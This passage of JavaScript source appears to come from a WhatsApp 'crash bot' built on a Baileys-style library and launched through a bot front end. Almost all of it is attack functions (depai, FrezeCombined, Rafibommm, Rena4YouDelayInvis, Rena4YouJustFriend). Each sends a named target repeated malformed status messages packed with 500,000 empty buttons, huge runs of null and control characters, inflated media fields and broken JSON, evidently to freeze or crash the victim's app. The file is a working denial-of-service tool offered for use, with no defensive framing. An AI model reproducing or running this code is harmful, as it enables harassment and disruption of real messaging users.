                    }
                }
            }
        }
    };

    const CrBLXC = generateWAMessageFromContent(target, CrBLLC, {});
    await sock.relayMessage(target, CrBLXC.message, {
        noSelfSync: true,
        messageId: CrBLXC.key.id
    });
}

async function depai(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "VnX Here" + "\0"
            },
            footer: {
              text: "By @Raffioffci5"
            },
            nativeFlowMessage: {
              buttons: "[]" + "?".repeat(300000),
              messageParamsJson: "]}".repeat(10000)
            },
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true
            }
          }
        }
      }
    }, { noSelfSync: true });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "K7 Company." },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { noSelfSync: true });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 9999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "COSMIC COMPANY.",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              },
              hasMediaAttachment: true
            },
            body: { text: "." },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { noSelfSync: true });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/12345678_1234567890123456_1234567890123456_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 999999,
                height: 720,
                width: 1280,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "VIDEO COSMIC.",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              },
              hasMediaAttachment: true
            },
            body: { text: "Video Payload" },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { noSelfSync: true });
  }
}

async function FrezeCombined(sock, target) {
    const CrBZB = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Nando Officiall ¡!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 9999,
                                expectedVideoCount: 9999
                            }
                        }
                    }
                }
            }
        }
    };
    const CrbB = generateWAMessageFromContent(target, CrBZB, {});
    await sock.relayMessage(target, CrbB.message, {
        noSelfSync: true,
        messageId: CrbB.key.id
    });

    const CrBZA = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Nando Officiall ¡!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 9999,
                                expectedVideoCount: 9999
                            }
                        }
                    }
                }
            }
        }
    };
    const CrbA = generateWAMessageFromContent(target, CrBZA, {});
    await sock.relayMessage(target, CrbA.message, {
        noSelfSync: true,
        messageId: CrbA.key.id
    });
}

async function Rafibommm(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9999999999999,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "Mia.Queen",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: Buffer.alloc(0)
                            }
                        },
                        body: {
                            text: "—Forgive Me Queen Mia",
                            format: "DEFAULT"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true
                        }
                    }
                }
            }
        };

        for (let i = 0; i < 5; i++) {
            await sock.relayMessage(target, msg, {
                noSelfSync: true,
                messageId: `Rafi_${Date.now()}_${i}`
            });
        }
    } catch (e) {
        console.error("Rafi Function Error:", e.message);
    }
}


async function Rena4YouDelayInvis(sock, target) {
    const bokep1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep1, {
        noSelfSync: true
    });

    const bokep2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep2, {
        noSelfSync: true
    });

    const bokep3 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep3, {
        noSelfSync: true
    });

    const bokep4 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\x10".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep4, {
        noSelfSync: true
    });

    const bokep5 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "[]".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep5, {
        noSelfSync: true
    });

    const bokep6 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "?".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep6, {
        noSelfSync: true
    });

    const bokep7 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u200B" + "\u200F".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep7, {
        noSelfSync: true
    });

    const bokep8 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep8, {
        noSelfSync: true
    });

    const bokep9 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u001A".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep9, {
        noSelfSync: true
    });

    const bokep10 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep10, {
        noSelfSync: true
    });
}


async function Rena4YouJustFriend(sock, target) {
    const basePayload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Rena4You",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000" + "\u001A".repeat(500000)
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    };

    for (let i = 0; i < 4; i++) {
        await sock.relayMessage(target, basePayload, { noSelfSync: true });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            submessages: [{
                                messageType: 8,
                                latexMetadata: {
                                    text: " ",
                                    expressions: [{
                                        latexExpression: " ",
                                        url: "https://t.me/RenaOffc",
                                        fontHeight: 9999999
                                    }]
                                }
                            }],
                            contextInfo: {
                                forwardingScore: 99999,
                                isForwarded: true,
                                forwardedAiBotMessageInfo: {
                                    botJid: "867051314767696@bot"
                                },
                                forwardOrigin: 4,
                                mentionedJid: [target]
                            }
                        }
                    }
                }
            }
        }
    }, { noSelfSync: true });

    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Rena Explore",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "payment_method",
                                buttonParamsJson: JSON.stringify({
                                    currency: "XXX",
                                    payment_configuration: "",
                                    payment_type: "",
                                    total_amount: {
                                        value: 1000000,
                                        offset: 100
                                    },
                                    reference_id: "4SWMDTS1PY4",
                                    type: "physical-goods",
                                    order: {
                                        status: "payment_requested",
                                        description: "",
                                        subtotal: {
                                            value: 0,
                                            offset: 100
                                        },
                                        order_type: "PAYMENT_REQUEST",
                                        items: [
                                            {
                                                retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                                                name: "Rena Explore",
                                                amount: {
                                                    value: 1000000,
                                                    offset: 100
                                                },
                                                quantity: 1
                                            }
                                        ]
                                    },
                                    additional_note: "Rena Explore",
                                    native_payment_methods: [],
                                    share_payment_status: false
                                })
                            }
                        ],
                        messageParamsJson: "}".repeat(10000)
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1, { noSelfSync: true });
}
//============( END ) =======\\
bot.launch()